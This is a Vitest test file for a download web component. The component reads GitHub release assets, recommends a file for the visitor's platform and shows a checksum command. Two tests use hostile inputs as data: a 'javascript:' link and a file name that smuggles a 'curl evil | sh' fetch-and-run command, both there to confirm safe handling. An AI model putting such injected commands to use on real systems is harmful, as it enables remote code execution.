// @ts-check
import { afterEach, describe, expect, it } from 'vitest';
import {
  archOf,
  detectPlatform,
  formatOf,
  osOf,
  readChecksums,
  readPlatform,
  readRelease,
  recommend,
} from '../../src/components/download/releases.js';
import { VtDownload } from '../../src/components/download/vt-download.js';

if (!customElements.get('vt-download')) customElements.define('vt-download', VtDownload);

const HASH = 'a'.repeat(64);
const url = (/** @type {string} */ name) => `https://github.com/o/app/releases/download/v1.2.0/${name}`; // prettier-ignore
const asset = (/** @type {string} */ name, size = 1000) => ({ name, size, browser_download_url: url(name) }); // prettier-ignore

const RELEASE = {
  tag_name: 'v1.2.0',
  name: 'App 1.2',
  html_url: 'https://github.com/o/app/releases/tag/v1.2.0',
  published_at: '2026-11-01T10:00:00Z',
  prerelease: false,
  zipball_url: 'https://api.github.com/repos/o/app/zipball/v1.2.0',
  assets: [
    { ...asset('App-1.2.0-universal.dmg', 90_000_000), digest: `sha256:${HASH}` },
    asset('App-1.2.0-arm64-mac.zip'),
    asset('App-Setup-1.2.0.exe'),
    asset('App-1.2.0-win-arm64.exe'),
    asset('App-1.2.0.AppImage'),
    asset('app_1.2.0_amd64.deb'),
    asset('app-1.2.0.aarch64.rpm'),
    asset('SHA256SUMS'),
    asset('App-1.2.0.AppImage.sig'),
  ],
};

/**
 * @param {Record<string, string>} attributes
 * @param {unknown} data
 * @returns {Promise<VtDownload>}
 */
async function mount(attributes, data) {
  const el = /** @type {VtDownload} */ (document.createElement('vt-download'));
  for (const [name, value] of Object.entries(attributes)) el.setAttribute(name, value);
  el.data = data;
  document.body.append(el);
  await new Promise((resolve) => setTimeout(resolve, 0));
  el.render();
  return el;
}

afterEach(() => document.body.replaceChildren());

describe('files', () => {
  it('reads system, architecture and format from names', () => {
    expect(osOf('ripgrep-14.1.0-x86_64-apple-darwin.tar.gz')).toBe('macos');
    expect(osOf('ripgrep-14.1.0-x86_64-pc-windows-gnu.zip')).toBe('windows');
    expect(osOf('ripgrep-14.1.0-aarch64-unknown-linux-musl.tar.gz')).toBe('linux');
    expect(osOf('app-darwin.zip')).toBe('macos');
    expect(osOf('app.apk')).toBe('android');
    expect(archOf('ripgrep-14.1.0-x86_64-apple-darwin.tar.gz')).toBe('x64');
    expect(archOf('app_1.0_amd64.deb')).toBe('x64');
    expect(archOf('app-aarch64.rpm')).toBe('arm64');
    expect(archOf('app-armv7.tar.gz')).toBe('arm');
    expect(archOf('app-i686.exe')).toBe('x86');
    expect(archOf('App-universal.dmg')).toBe('universal');
    expect(archOf('App.dmg')).toBeNull();
    expect(formatOf('a.tar.gz')).toBe('tar.gz');
    expect(formatOf('a.tgz')).toBe('tar.gz');
    expect(formatOf('a.AppImage')).toBe('appimage');
  });

  it('reads checksums files', () => {
    const hashes = readChecksums(`${HASH}  app.deb\n${'b'.repeat(64)} *app.exe\nSHA256 (app.dmg) = ${'c'.repeat(64)}`); // prettier-ignore
    expect([...hashes.keys()]).toEqual(['app.deb', 'app.exe', 'app.dmg']);
  });

  it('reads a GitHub release, its digests, signatures and source code', () => {
    const release = readRelease(RELEASE);
    expect(release.version).toBe('v1.2.0');
    expect(release.assets[0].sha256).toBe(HASH);
    expect(release.assets.filter((a) => a.verify).map((a) => a.name)).toEqual(['SHA256SUMS', 'App-1.2.0.AppImage.sig']); // prettier-ignore
    expect(release.assets.at(-1)).toMatchObject({ os: 'source', name: 'v1.2.0.zip' });
  });

  it('picks the newest release from a list, and refuses unsafe links', () => {
    const list = [
      { ...RELEASE, tag_name: 'v2.0.0-beta', prerelease: true },
      { ...RELEASE, tag_name: 'v1.9.0', draft: true },
      RELEASE,
    ];
    expect(readRelease(list).version).toBe('v1.2.0');
    expect(readRelease(list, { prerelease: true }).version).toBe('v2.0.0-beta');
    expect(readRelease(list, { version: 'v2.0.0-beta' }).version).toBe('v2.0.0-beta');
    const bad = readRelease({ files: [{ name: 'x.exe', url: 'javascript:alert(1)' }] });
    expect(bad.assets).toEqual([]);
    expect(() => readRelease({ nothing: true })).toThrow();
  });

  it('recommends the file that suits a platform', () => {
    const { assets } = readRelease(RELEASE);
    const pick = (/** @type {string} */ p, /** @type {string[]} */ prefer = []) => recommend(assets, /** @type {any} */ (readPlatform(p)), prefer).best?.name; // prettier-ignore
    expect(pick('macos')).toBe('App-1.2.0-universal.dmg');
    expect(pick('windows-x64')).toBe('App-Setup-1.2.0.exe');
    expect(pick('windows-arm64')).toBe('App-1.2.0-win-arm64.exe');
    expect(pick('linux-x64')).toBe('App-1.2.0.AppImage');
    expect(pick('linux-x64', ['deb'])).toBe('app_1.2.0_amd64.deb');
    expect(pick('linux-arm64', ['rpm'])).toBe('app-1.2.0.aarch64.rpm');
    expect(pick('android')).toBeUndefined();
  });

  it('guesses the platform from the browser', () => {
    const win = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
    expect(detectPlatform({ userAgent: win })).toEqual({ os: 'windows', arch: 'x64' });
    const mac = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15';
    expect(detectPlatform({ userAgent: mac, maxTouchPoints: 0 })).toEqual({ os: 'macos', arch: null }); // prettier-ignore
    expect(detectPlatform({ userAgent: mac, maxTouchPoints: 5 }).os).toBe('ios');
    expect(detectPlatform({ userAgent: 'X11; Linux aarch64' })).toEqual({ os: 'linux', arch: 'arm64' }); // prettier-ignore
  });
});

describe('<vt-download>', () => {
  it('shows a button for the platform, the table and the check', async () => {
    const el = await mount({ platform: 'macos' }, RELEASE);
    const button = /** @type {HTMLAnchorElement} */ (el.root.querySelector('.dl-button'));
    expect(button.getAttribute('href')).toBe(url('App-1.2.0-universal.dmg'));
    expect(button.textContent).toContain('Download for macOS');
    expect(el.root.querySelector('.dl-also')?.textContent).toContain('App-1.2.0-arm64-mac.zip');
    expect(el.root.querySelector('.dl-command')?.textContent).toContain('shasum -a 256 App-1.2.0-universal.dmg'); // prettier-ignore
    expect(el.root.querySelectorAll('.dl-table tbody tr')).toHaveLength(8);
  });

  it('quotes names in the command that checks a file', async () => {
    const name = "x'; curl evil | sh; '.exe";
    const el = await mount({ platform: 'windows' }, { files: [{ name, url: url('x.exe'), sha256: HASH }] }); // prettier-ignore
    expect(el.root.querySelector('.dl-command code')?.textContent).toBe(`Get-FileHash -Algorithm SHA256 '.\\x''; curl evil | sh; ''.exe'`); // prettier-ignore
  });

  it('lets the page cancel a download', async () => {
    const el = await mount({ platform: 'linux-x64' }, RELEASE);
    /** @type {any[]} */
    const seen = [];
    el.addEventListener('vt-download', (e) => {
      seen.push(/** @type {CustomEvent} */ (e).detail);
      e.preventDefault();
    });
    const click = new MouseEvent('click', { bubbles: true, cancelable: true });
    el.root.querySelector('.dl-button')?.dispatchEvent(click);
    expect(click.defaultPrevented).toBe(true);
    expect(seen[0]).toMatchObject({ name: 'App-1.2.0.AppImage', os: 'linux', recommended: true });
  });

  it('says when there is no file for the platform', async () => {
    const el = await mount({ platform: 'android' }, RELEASE);
    expect(el.root.querySelector('.dl-button')).toBeNull();
    expect(el.root.querySelector('.dl-for')?.textContent).toContain('No file for Android');
    expect(el.root.querySelector('details')?.hasAttribute('open')).toBe(true);
  });
});
